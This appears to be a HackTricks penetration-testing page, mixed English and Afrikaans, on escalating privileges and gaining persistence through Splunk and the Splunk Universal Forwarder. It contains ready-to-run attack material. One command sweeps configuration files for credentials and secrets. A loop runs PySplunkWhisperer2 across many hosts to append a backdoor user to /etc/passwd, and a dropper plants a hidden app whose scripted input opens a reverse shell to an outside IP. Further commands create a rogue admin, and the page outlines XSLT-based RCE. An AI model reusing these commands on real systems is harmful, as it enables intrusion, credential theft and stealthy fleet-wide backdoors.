# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

If you **enumerate** a machine **internally** or **externally** and you find **Splunk running** (usually **8000** vir die web UI en **8089** vir die management API), kan geldige credentials dikwels in **code execution** verander word deur app installation, scripted inputs, of management actions. If Splunk as **root** loop, word dit dikwels 'n onmiddellike **privilege escalation**.

If you only need the generic remote attack surface, enumeration, or app-upload RCE path, check:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

If you are **already root** and the Splunk service is not listening only on localhost, you can also steal **Splunk password hashes**, recover **encrypted secrets**, or push a **malicious app** to keep persistence locally or across multiple forwarders.

## Interesting Local Files

When you land on a host running Splunk or Splunk Universal Forwarder, these are usually the most interesting paths:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Belangrike artefakte:

- **`$SPLUNK_HOME/etc/passwd`**: plaaslike Splunk gebruikers en wagwoord-hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: sleutel gebruik deur Splunk om secrets te enkripteer wat in verskeie `.conf` lêers gestoor word.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: aanvanklike admin bootstrap-lêer; nuttig in gold images en provisioning foute. Dit word geïgnoreer as `etc/passwd` reeds bestaan.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: waar scripted inputs algemeen geaktiveer word.
- **`$SPLUNK_HOME/etc/deployment-apps/`** of **`$SPLUNK_HOME/etc/apps/`**: goeie plekke om 'n persistent app weg te steek of te hersien wat reeds versprei word.

## Splunk Universal Forwarder Agent Exploit Summary

Vir verdere besonderhede kyk [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dit is net 'n opsomming:

**Exploit-oorsig:**
'n Exploit wat die Splunk Universal Forwarder (UF) teiken, laat attackers met die **agent password** toe om arbitrêre code op stelsels wat die agent draai, uit te voer, wat moontlik 'n groot deel van die omgewing kompromitteer.

**Hoekom dit werk:**

- Die UF management service is algemeen blootgestel op **TCP 8089**.
- Attackers kan by die API authenticate en die forwarder opdrag gee om 'n **malicious app bundle** te installeer.
- Dieselfde primitive kan plaaslik vir **LPE** of afgeleë vir **RCE** gebruik word.
- Publieke tooling soos **SplunkWhisperer2** skep die app bundle outomaties en kan payloads vir Linux targets aanpas.

**Algemene maniere om die password te herstel:**

- Cleartext credentials in dokumentasie, scripts, shares, of deployment automation.
- Password hashes binne `$SPLUNK_HOME/etc/passwd` gevolg deur offline cracking.
- Golden images of provisioning oorblyfsels soos `user-seed.conf`.

**Impak:**

- SYSTEM/root-level code execution op elke gekompromitteerde host.
- Ontplooiing van persistent apps, backdoors, of ransomware.
- Deaktivering of tampering met telemetry voordat die data verder gestuur word.

**Voorbeeld command vir exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Bruikbare public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

As jy **filesystem write access** as `root`/`splunk` het, of geverifieerde toegang om apps te installeer, is 'n baie betroubare persistence-meganisme om 'n **custom app** met 'n **scripted input** te plaas. Splunk se eie dokumentasie verwag dat scripted inputs onder 'n app directory leef en via `inputs.conf` geaktiveer word.

Tipiese uitleg:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimale `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Vinnige Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notas:

- Dieselfde truuk werk op **Universal Forwarder** met behulp van `/opt/splunkforwarder/etc/apps/`.
- Aanvallers meng dikwels in deur 'n wettige add-on te wysig in plaas daarvan om 'n duidelik kwaadwillige app te skep.
- Op 'n **deployment server**, verander die plant van 'n kwaadwillige app binne `deployment-apps/` in **fleet-wide persistence** omdat forwarders poll, opgedateerde apps aflaai, en dikwels herbegin om dit toe te pas.

## Credential Theft en Admin Takeover

As jy Splunk se local files kan lees, is daar gewoonlik twee goeie doelwitte: herstel **Splunk admin access** en herstel **encrypted service credentials**.

### Password hashes en local users

Splunk stoor local authentication data in `etc/passwd`. Afhangend van die deployment, kan die kraak van daardie lêer werkende credentials vir die web UI en die management API herstel.

As jy reeds geldige **admin** credentials het en Splunk gebruik sy **native** authentication backend, kan die CLI self vir persistence gebruik word:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` en geënkripteerde waardes

Splunk gebruik `etc/auth/splunk.secret` om sensitiewe waardes te beskerm wat in verskeie konfigurasielêers gestoor word. As jy beide die **secret** en die relevante **`.conf`**-lêers kan steel, kan jy dikwels die volgende herstel of hergebruik:

- forwarder/indexer shared secrets soos `pass4SymmKey`
- TLS private-key passwords soos `sslPassword`
- LDAP bind credentials soos `bindDNPassword`

Dit is nuttig vir **lateral movement** selfs wanneer die Splunk admin password self nie kraakbaar is nie.

### `user-seed.conf` abuse

`user-seed.conf` word net tydens die eerste start of wanneer `etc/passwd` nie bestaan nie, verwerk. Dit maak dit minder nuttig op 'n live box, maar baie interessant in:

- compromised installation templates
- container images
- unattended provisioning workflows
- appliances where Splunk is reinitialized automatically

In daardie gevalle gee die plant van 'n `HASHED_PASSWORD` wat met `splunk hash-passwd` gegenereer is, jou 'n stille manier om admin access te herwin na redeployment.

## Abusing Splunk Queries

Vir verdere besonderhede kyk [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

'n Nuttige onlangse technique is om **user-supplied XSLT** in kwesbare Splunk Enterprise weergawes te abuse om 'n lae-privilege authenticated account in **OS command execution** as die `splunk` user te verander.

Hoëvlak-flow:

1. Authenticate to Splunk.
2. Upload 'n malicious **XSL**-lêer deur die preview/upload functionality.
3. Laat Splunk search results render met daardie uploaded stylesheet vanaf die **dispatch** directory.
4. Gebruik die XSLT payload om 'n file te skryf of execution te trigger deur Splunk se search pipeline (byvoorbeeld deur interne functionality soos `runshellscript` te bereik).

Die belangrike offensive takeaway is dat hierdie path **post-auth RCE without needing app upload** is. Op Linux beland jy gewoonlik in die **`splunk`** account, wat steeds waardevol is omdat daardie user dikwels die application tree besit, secrets kan lees, en persistent apps kan plant wat shell loss oorleef.

'n Verteenwoordigende path wat tydens exploitation gebruik word is:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
As Splunk met te veel voorregte loop, of as die `splunk`-gebruiker toegang het tot gevaarlike scripts, skryfbare service units, of swak `sudo`-reëls, word dit 'n skoon **LPE**-ketting.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
